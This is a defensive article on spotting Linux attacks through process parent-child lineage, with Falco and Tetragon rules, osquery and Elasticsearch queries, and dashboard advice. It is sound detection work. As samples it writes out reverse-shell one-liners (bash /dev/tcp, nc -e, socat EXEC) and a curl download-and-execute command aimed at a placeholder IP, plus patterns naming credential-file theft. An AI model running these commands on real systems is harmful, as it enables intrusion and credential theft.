---
title: "Process Tree Security Analysis: Detecting Attacks Through Process Lineage"
description: "Individual process events look normal in isolation. Process lineage exposes the attack: nginx spawning bash spawning curl is a web shell, not routine activity. This article covers eBPF-based parent tracking, Falco rules, osquery lineage queries, Elasticsearch aggregations, and specific detection patterns for web shells, reverse shells, credential dumping, and container escapes."
slug: process-tree-security-analysis
date: 2026-05-07
lastmod: 2026-05-07
category: observability
tags:
  - process-monitoring
  - process-tree
  - endpoint-detection
  - ebpf
  - threat-detection
personas:
  - security-engineer
  - security-analyst
article_number: 547
difficulty: Advanced
estimated_reading_time: 12
published: true
layout: article.njk
permalink: /articles/observability/process-tree-security-analysis/
---

# Process Tree Security Analysis: Detecting Attacks Through Process Lineage

## Problem

Individual process events are nearly useless as security signals. `bash` executes thousands of times per hour on any busy Linux system. `curl` is a routine network utility. `python3` runs in virtually every application stack. Signature-based detection on individual execve events generates noise volumes that analysts cannot triage.

Process lineage changes everything. `bash` executed by `nginx` is not routine — it is almost certainly a web shell execution. `curl` spawned by `java` is suspicious in most application contexts. `python3 -c` spawned by `gunicorn` with a base64-encoded argument payload is an active compromise. The parent-child-grandchild relationship transforms ambiguous individual events into high-fidelity attack indicators.

The specific gaps in most environments:

- **Process events are collected without parent context.** Most SIEM deployments ingest execve events but strip or ignore the `ppid` and `parent_process_name` fields. Analysts cannot reconstruct lineage after the fact.
- **Alert rules fire on process names, not ancestry.** Alerting on `bash` execution misses the signal; alerting on `httpd → bash` catches it. Existing rule sets rarely encode this.
- **Process trees are never visualised.** Even when parent data is available, no dashboard shows the execution tree from a given ancestor down to leaf processes. Analysts stare at flat event tables.
- **Container contexts collapse visibility.** In Kubernetes environments, the container PID namespace means processes visible at the node level have different PIDs than within the container. Tooling must bridge both namespaces.

By 2026, mature endpoint detection programmes instrument every host with eBPF-based process tracking that captures full ancestry chains, feed structured lineage events to a searchable store, and maintain automated rules that fire on parent-child combinations rather than process names in isolation.

**Target systems:** Linux kernel 5.8+ (eBPF requirement). [Tetragon](https://tetragon.io) 1.2+ or [Falco](https://falco.org) 0.38+. [Osquery](https://osquery.io) 5.10+. [Elasticsearch](https://www.elastic.co/elasticsearch/) 8.12+ with ECS-mapped events.

## Threat Model

- **Adversary 1 — Web shell operator:** Attacker exploits an application vulnerability (file upload, deserialization, template injection) to deploy a web shell. The web server process becomes the parent of attacker-controlled shell commands.
- **Adversary 2 — Reverse shell via RCE:** Attacker exploits an RCE vulnerability in a Java application or Node.js service. The application process spawns a shell with a network callback to the attacker's infrastructure.
- **Adversary 3 — Credential dumping:** Attacker with existing foothold reads `/etc/shadow`, iterates `/proc/[pid]/mem` of privileged processes, or accesses SSH private key files from an unexpected process context.
- **Adversary 4 — Container escape attempt:** Attacker inside a container attempts to break out by spawning `nsenter`, `unshare`, or accessing the host PID namespace through `/proc` manipulation.
- **Common property of all four:** Each attack produces a parent-child process relationship that is detectable via lineage analysis, even when neither the parent nor the child is individually suspicious.

## Why Lineage Beats Individual Events

Consider three execve events arriving in sequence:

```
process: nginx        args: [nginx, -g, daemon off;]
process: bash         args: [bash, -i]
process: curl         args: [curl, http://203.0.113.50/stage2.sh, -o, /tmp/s]
```

Individually: a web server starting, a shell opening, a network request. All three appear in normal system activity thousands of times per day. No individual signature fires.

Now consider the process tree:

```
nginx (pid 1234)
  └── bash (pid 5678, ppid 1234)
        └── curl (pid 9012, ppid 5678)
```

The lineage `nginx → bash → curl` is immediately recognisable as a web shell being used to download a second-stage payload. The attack is unambiguous. No individual event was suspicious; the ancestry chain is.

This is the fundamental insight driving process tree analysis: **attackers cannot avoid revealing themselves through process lineage**, because they must spawn processes from their initial foothold, and that foothold is always an unexpected parent for the processes they need to run.

## Collecting Process Events with Parent Context

### Tetragon TracingPolicy for Full Ancestry

[Tetragon](https://tetragon.io) captures execve events with parent process metadata natively through its eBPF engine. The following TracingPolicy attaches to the `execve` and `execveat` syscalls and includes parent process information:

```yaml
# tetragon-process-lineage.yaml
# TracingPolicy capturing execve events with parent context.
# Applies to all processes on the node.
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: process-lineage-tracking
spec:
  kprobes:
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"   # Executable path.
        - index: 1
          type: "string_array"   # argv.
      selectors:
        - matchActions:
            - action: Post
              # Include parent process context in every event.
              # Tetragon automatically populates process.parent fields.
```

Tetragon JSON events include the full process ancestry chain:

```json
{
  "process_exec": {
    "process": {
      "exec_id": "a1b2c3",
      "pid": 9012,
      "binary": "/usr/bin/curl",
      "arguments": "http://203.0.113.50/stage2.sh -o /tmp/s",
      "start_time": "2026-05-07T14:23:01.123Z",
      "pod": {
        "name": "web-frontend-7d4b9c-xk2pq",
        "namespace": "production",
        "container": {
          "name": "nginx",
          "image": "nginx:1.25.3"
        }
      }
    },
    "parent": {
      "exec_id": "d4e5f6",
      "pid": 5678,
      "binary": "/bin/bash",
      "arguments": "-i"
    }
  }
}
```

The `parent` field is populated by Tetragon's eBPF process cache, which tracks process ancestry independently of userspace — it cannot be spoofed by manipulating `/proc`.

### Falco Rules Using `proc.pname`

[Falco](https://falco.org) exposes `proc.pname` (parent process name) and `proc.aname[N]` (ancestor at depth N) in its rule language. These enable lineage-based detection without requiring a separate process tree reconstruction step:

```yaml
# falco-process-lineage-rules.yaml
# Rules detecting attacks through parent-child process relationships.

# Web shell: any web server spawning an interactive shell.
- rule: Web Server Spawning Shell
  desc: >
    A web server process has spawned a shell interpreter. This is the canonical
    web shell execution pattern. Legitimate web servers never spawn shells.
  condition: >
    spawned_process
    and shell_procs
    and proc.pname in (web_server_binaries)
  output: >
    Web shell execution detected
    (parent=%proc.pname parent_pid=%proc.ppid
     child=%proc.name child_pid=%proc.pid
     args=%proc.args user=%user.name
     container=%container.id pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [web-shell, process-lineage, T1505.003]

# Application server spawning shell (Java, Node, Python app servers).
- rule: Application Server Spawning Shell
  desc: >
    An application server has spawned a shell. Indicates RCE via deserialization,
    SSTI, or similar application-layer vulnerability.
  condition: >
    spawned_process
    and shell_procs
    and proc.pname in (java, node, python3, uvicorn, gunicorn, uwsgi,
                       catalina.sh, startup.sh, server.js)
  output: >
    Application server shell spawn detected
    (parent=%proc.pname ppid=%proc.ppid
     child=%proc.name pid=%proc.pid
     args=%proc.args cmdline=%proc.cmdline
     container=%container.id)
  priority: CRITICAL
  tags: [rce, process-lineage, T1059]

# Macro definitions for reuse across rules.
- macro: web_server_binaries
  condition: >
    proc.pname in (nginx, apache2, httpd, lighttpd, caddy,
                   php-fpm, php, python3, ruby, perl)

- macro: shell_procs
  condition: >
    proc.name in (bash, sh, dash, zsh, ksh, fish, tcsh,
                  busybox)
```

The `proc.aname[N]` field extends detection to grandparent and great-grandparent processes. A rule that fires on `bash` whose grandparent is `nginx` catches cases where the web shell spawns an intermediate interpreter before reaching the shell:

```yaml
- rule: Web Shell Indirect Shell Spawn
  desc: >
    Shell spawned with a web server as grandparent, indicating web shell
    using an interpreter as an intermediate step (e.g., nginx → python → bash).
  condition: >
    spawned_process
    and shell_procs
    and proc.aname[2] in (nginx, apache2, httpd, php-fpm, gunicorn)
  output: >
    Indirect web shell execution
    (ancestor=%proc.aname[2] parent=%proc.pname
     shell=%proc.name args=%proc.args)
  priority: CRITICAL
  tags: [web-shell, process-lineage]
```

### Osquery Process Events and Open Sockets

[Osquery](https://osquery.io) enables point-in-time and scheduled process tree queries via the `processes` table (which includes `parent` as the ppid) and `process_open_sockets` for correlating network activity with process lineage:

```sql
-- osquery: suspicious_web_server_children.sql
-- Find processes whose parent is a web server binary.
-- Returns immediately from current process table state.
SELECT
  p.pid,
  p.name AS process_name,
  p.cmdline,
  p.cwd,
  p.uid,
  p.gid,
  p.start_time,
  parent.pid AS parent_pid,
  parent.name AS parent_name,
  parent.cmdline AS parent_cmdline
FROM
  processes AS p
  JOIN processes AS parent ON p.parent = parent.pid
WHERE
  parent.name IN ('nginx', 'apache2', 'httpd', 'php-fpm', 'gunicorn', 'uvicorn')
  AND p.name IN ('bash', 'sh', 'dash', 'python3', 'perl', 'ruby',
                 'nc', 'ncat', 'socat', 'curl', 'wget');
```

```sql
-- osquery: process_with_suspicious_network.sql
-- Correlate process lineage with active network connections.
-- Identifies processes with unusual parents that have open sockets.
SELECT
  p.pid,
  p.name,
  p.cmdline,
  parent.name AS parent_name,
  s.remote_address,
  s.remote_port,
  s.local_port,
  s.state
FROM
  process_open_sockets AS s
  JOIN processes AS p ON s.pid = p.pid
  JOIN processes AS parent ON p.parent = parent.pid
WHERE
  parent.name IN ('nginx', 'apache2', 'httpd', 'java', 'node', 'python3')
  AND p.name IN ('bash', 'sh', 'nc', 'socat', 'curl')
  AND s.remote_address != ''
  AND s.remote_port != 0;
```

Schedule these as fleet-wide queries with a 60-second interval. Any result returned by either query is a high-fidelity incident trigger.

## Building a Process Tree in Elasticsearch

Events from Tetragon and Falco reach [Elasticsearch](https://www.elastic.co/elasticsearch/) via the OTel Collector or Filebeat. ECS (Elastic Common Schema) maps process lineage into standardised fields: `process.name`, `process.pid`, `process.parent.name`, `process.parent.pid`.

### Lineage Aggregation Query

The following Elasticsearch query reconstructs the full execution chain under a suspect parent process:

```json
// elasticsearch: process-lineage-aggregation.json
// Aggregate child and grandchild processes spawned by nginx in the last 1 hour.
// Run against the security-events-* index.
{
  "query": {
    "bool": {
      "filter": [
        { "term":  { "event.category": "process" } },
        { "term":  { "event.type":     "start"   } },
        { "term":  { "process.parent.name": "nginx" } },
        { "range": { "@timestamp": { "gte": "now-1h" } } }
      ]
    }
  },
  "aggs": {
    "child_processes": {
      "terms": {
        "field": "process.name",
        "size":  50
      },
      "aggs": {
        "grandchildren": {
          "terms": {
            "field": "process.args",
            "size":  20
          }
        },
        "by_host": {
          "terms": {
            "field": "host.name",
            "size":  20
          }
        }
      }
    }
  },
  "size": 0
}
```

### Painless Script for Lineage String Construction

Construct a concatenated lineage string as a runtime field to enable fast filtering on the full ancestry chain:

```json
// elasticsearch: lineage-runtime-field.json
// Define a runtime field that concatenates parent → child into a single
// searchable string. Add this to the index mapping or query runtime_mappings.
{
  "runtime_mappings": {
    "process.lineage": {
      "type": "keyword",
      "script": {
        "source": """
          String parent = doc.containsKey('process.parent.name')
            && doc['process.parent.name'].size() > 0
            ? doc['process.parent.name'].value
            : 'unknown';
          String child = doc.containsKey('process.name')
            && doc['process.name'].size() > 0
            ? doc['process.name'].value
            : 'unknown';
          emit(parent + ' → ' + child);
        """
      }
    }
  }
}
```

Filter on `process.lineage: "nginx → bash"` to pull every instance of that parent-child pair across the entire fleet and the full retention window.

## Specific Detection Patterns

### Web Shell Detection

Web shells are detected by the parent-child pair: any web server or application framework spawning a shell interpreter or scripting language in an interactive or command-execution mode.

High-fidelity indicators:
- `nginx`, `apache2`, `httpd`, `lighttpd` spawning `bash`, `sh`, `dash`, `python3`, `perl`, `ruby`
- `php-fpm`, `php` spawning `bash` or `sh` (PHP web shells are the most common variant)
- `gunicorn`, `uvicorn`, `uwsgi` spawning `python3 -c` or `bash -c` with base64-encoded arguments
- Any of the above spawning `curl`, `wget`, `fetch` (downloading second-stage payloads)

The cmdline argument pattern adds additional signal. Web shell commands are typically short, encoded, or invoke standard utilities in unusual ways:

```
python3 -c "import base64,subprocess;subprocess.call(base64.b64decode('...'))"
bash -c "curl http://203.0.113.50/s -o /tmp/s && chmod +x /tmp/s && /tmp/s"
perl -e 'use Socket;...'
```

### Reverse Shell Indicators

Reverse shells are detectable through a combination of parent lineage and process argument patterns. Key signatures:

- `bash` with `/dev/tcp/` in its argument list: `bash -i >& /dev/tcp/203.0.113.50/4444 0>&1`
- `nc` or `ncat` with `-e` flag (execute): `nc 203.0.113.50 4444 -e /bin/bash`
- `socat` with `EXEC:` directive: `socat TCP:203.0.113.50:4444 EXEC:bash`
- `python3` or `python` running a socket-based reverse shell one-liner
- Any shell process with stdin/stdout/stderr all redirected to a network socket (`/proc/[pid]/fd/` showing socket file descriptors for 0, 1, and 2)

Falco rule for bash `/dev/tcp` reverse shells:

```yaml
- rule: Bash Reverse Shell via /dev/tcp
  desc: >
    Bash executed with /dev/tcp redirection, the standard bash reverse shell
    technique. This is almost never legitimate in production environments.
  condition: >
    spawned_process
    and proc.name = bash
    and (proc.args contains "/dev/tcp/" or proc.args contains "/dev/udp/")
  output: >
    Bash reverse shell detected
    (pid=%proc.pid args=%proc.args parent=%proc.pname
     user=%user.name container=%container.id)
  priority: CRITICAL
  tags: [reverse-shell, T1059.004]
```

### Credential Dumping Indicators

Credential access produces detectable process-level signals through file access patterns and process lineage:

**`/etc/shadow` reads from unexpected processes:**

```yaml
- rule: Shadow File Read by Non-Privileged Process
  desc: >
    A process that is not a recognised system authentication binary is reading
    /etc/shadow. Indicates credential dumping attempt.
  condition: >
    open_read
    and fd.name = /etc/shadow
    and not proc.name in (passwd, shadow, useradd, usermod,
                          chpasswd, unix_chkpwd, sshd, login, su, sudo)
  output: >
    Unexpected shadow file access
    (process=%proc.name pid=%proc.pid parent=%proc.pname
     user=%user.name)
  priority: CRITICAL
  tags: [credential-access, T1003.008]
```

**`/proc/[pid]/mem` access for process memory dumping:**

Processes reading another process's memory via `/proc/[pid]/mem` are performing in-memory credential extraction. The pattern `ptrace`-open or `open(/proc/[N]/mem)` from a process that is not `gdb`, `strace`, or a known profiler is a credential dumping indicator.

**SSH key file access from unexpected processes:**

```sql
-- osquery: unexpected_ssh_key_access.sql
-- Processes opening SSH private key files that are not ssh/scp/sftp clients.
SELECT
  p.name,
  p.cmdline,
  p.pid,
  parent.name AS parent_name,
  f.path AS accessed_file
FROM
  process_open_files AS f
  JOIN processes AS p ON f.pid = p.pid
  JOIN processes AS parent ON p.parent = parent.pid
WHERE
  f.path LIKE '%/.ssh/id_%'
  AND f.path NOT LIKE '%.pub'
  AND p.name NOT IN ('ssh', 'scp', 'sftp', 'git', 'rsync', 'ansible');
```

### Container Escape Indicators

Container escapes require the attacker to cross namespace boundaries. The process lineage that precedes an escape attempt is detectable before the escape succeeds:

- Container process spawning `nsenter` or `unshare` (namespace manipulation)
- Process accessing `/proc/1/root` or `/proc/1/ns/` from inside a container (reaching host namespace via `/proc`)
- Unexpected `mount` syscalls from a container process (attempting to mount host filesystems)
- `runc` or `containerd-shim` spawning `bash` or `sh` (exploitation of container runtime vulnerabilities like CVE-2024-21626)

Tetragon TracingPolicy for mount syscall detection inside containers:

```yaml
# tetragon-container-escape-mount.yaml
# Block unexpected mount syscalls originating from container processes.
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: container-escape-mount-detection
spec:
  kprobes:
    - call: "sys_mount"
      syscall: true
      selectors:
        - matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "host"   # Only match processes in non-host PID namespaces (containers).
          matchActions:
            - action: Sigkill   # Block and kill the attempting process immediately.
            - action: Post      # Also emit a detection event.
```

## Visualising Process Trees in Kibana and Grafana

### Kibana Session View

Kibana's Session View (available in Elastic Security 8.4+) renders process trees natively from ECS-formatted events. Enable it by:

1. Ensuring all process events include `process.entry_leader.entity_id` and `process.session_leader.entity_id` fields (populated by Elastic Agent's system integration).
2. Opening any process event in the Security alerts view and selecting "Analyse Event" to render the full session tree.

The Session View shows the complete process ancestry from the session entry point (typically `sshd` or a container entrypoint) down to every child process, with network connections and file accesses correlated against each process node.

### Grafana Process Ancestry Dashboard

For environments using Grafana rather than Kibana, a Loki-backed process tree dashboard queries structured Tetragon JSON logs:

```logql
# LogQL: web server shell spawn rate over time.
# Panels: time series showing rate of nginx/apache spawning shell children.
sum by (process_parent_name, process_name) (
  rate(
    {job="tetragon"}
      | json
      | process_parent_name =~ "nginx|apache2|httpd|gunicorn"
      | process_name =~ "bash|sh|python3|perl"
    [5m]
  )
)
```

Dashboard panels:
- **Top suspicious lineage pairs** (table): `process.parent.name → process.name` aggregated over 24 hours, sorted by frequency. Zero is the expected value for web server → shell combinations.
- **Reverse shell attempt rate** (time series): execve events matching `/dev/tcp`, `nc -e`, or `socat EXEC` arguments, by host and container.
- **Credential file access heatmap** (heatmap): `/etc/shadow`, `/proc/*/mem`, and `~/.ssh/id_*` access events by hour of day, to surface timing patterns.
- **New lineage pairs** (alert panel): any parent-child combination observed for the first time in the last 24 hours that was not seen in the prior 30-day baseline window.

## Operational Guidance

**Baseline before alerting.** Before enabling process lineage alerting in production, run all queries in observe-only mode for two weeks. Build a `known_safe_lineage` list covering any legitimate parent-child patterns your environment produces (for example, a custom deployment script that is triggered by a web API call and spawns shell commands in a controlled, audited way). Reduce false positives before the rules go live; a high false positive rate causes analysts to tune out lineage alerts, which are otherwise very high fidelity.

**Preserve process events for at least 30 days.** Process tree analysis during incident response requires historical lineage. An analyst investigating a compromise discovered today may need to trace the initial foothold back three weeks. A 7-day retention window makes this impossible. 30 days is the minimum; 90 days is strongly preferred.

**Alert on lineage, investigate with osquery.** Automated Falco and Tetragon rules fire on lineage patterns in real time. When an alert fires, use osquery to sweep the entire fleet for the same pattern — a web shell on one host may indicate a coordinated campaign targeting multiple hosts simultaneously.

**Tag with MITRE ATT&CK.** All process lineage rules should carry ATT&CK technique IDs in their tags. Web shell execution is T1505.003. Reverse shells are T1059. Credential dumping via `/proc/mem` is T1003.007. Tagging enables SIEM correlation, report generation, and gap analysis against the ATT&CK framework.

## Key Takeaways

Process tree analysis converts low-fidelity individual process events into high-fidelity attack indicators by evaluating parent-child relationships. The implementation requires three things: collection tooling that captures parent context at the kernel level (Tetragon or Falco with `proc.pname`), a searchable store that preserves lineage fields in a queryable form (Elasticsearch with ECS mapping), and detection rules that fire on lineage pairs rather than individual process names.

The four highest-value detection patterns — web shell execution (web server → shell), reverse shells (application server → bash with /dev/tcp), credential dumping (unexpected access to `/etc/shadow` or `/proc/pid/mem`), and container escape attempts (mount syscalls or namespace manipulation from container processes) — each have concrete, testable signatures that produce near-zero false positives in any environment where the baseline is established first.
